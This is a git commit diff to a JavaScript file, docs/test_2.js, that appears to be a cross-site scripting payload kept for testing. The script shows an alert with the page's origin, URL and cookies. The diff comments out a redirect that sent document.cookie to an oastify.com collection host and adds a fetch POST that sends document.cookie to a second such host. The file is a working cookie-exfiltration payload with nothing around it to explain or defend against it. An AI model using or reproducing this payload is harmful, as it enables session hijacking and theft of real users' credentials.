e1cb3c3f4f9199b883d157c4371121b50faebea2
PassingCrane <43327842+PassingCrane@users.noreply.github.com>
2024-06-22 17:44:02 +0900

    Update test_2.js

--- docs/test_2.js
+++ docs/test_2.js
@@ -1,3 +1,4 @@
 alert('Wow---! Origin: '+location.origin+'\nUrl: '+top.location.href+'?cookie='+document.cookie);
 
-window.location.href=`https://0312ugjapfbkuniqawy2qucjfal19wxl.oastify.com/?get=`+document.cookie;
+//window.location.href=`https://0312ugjapfbkuniqawy2qucjfal19wxl.oastify.com/?get=`+document.cookie;
+fetch('http://jl8lcz1t7yt3c609sfgl8du2xt3krif7.oastify.com'+document.cookie,{method: 'POST'})
